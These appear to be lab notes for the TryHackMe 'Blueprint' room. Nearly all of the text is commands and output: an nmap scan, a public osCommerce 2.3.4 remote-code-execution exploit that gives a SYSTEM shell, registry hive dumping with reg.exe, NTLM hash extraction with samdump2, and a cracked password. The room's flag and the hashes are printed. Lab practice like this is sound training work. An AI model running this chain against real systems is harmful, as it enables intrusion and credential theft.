
#tryhackmelabs #laboratorio 

https://tryhackme.com/r/room/blueprint?ref=blog.tryhackme.com

```
nmap -Pn -sV -O --open -p- 10.10.236.29 
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC

```

```
http://10.10.236.29:8080/
```

```
searchsploit osCommerce 2.3.4
```

```
searchsploit -m 50128
```

```
python3 50128.py http://10.10.236.29:8080/oscommerce-2.3.4/catalog/
```

```
whoami
```

```
RCE_SHELL$ whoami
nt authority\system
```

```
net users
```
```
Administrator            Guest                    Lab 
```

```
type C:\Users\Administrator\Desktop\root.txt.txt
```
```
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```


```
reg.exe save HKLM\SAM sam.bak
```

```
reg.exe save HKLM\SYSTEM system.bak
```

```
reg.exe save HKLM\SECURITY security.bak
```

http://10.10.236.29:8080/oscommerce-2.3.4/catalog/install/includes/

```
samdump2 system.bak sam.bak
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```
https://crackstation.net/
```
30e87bf999828446a1c1209ddde4c450
```
```
googleplus
```

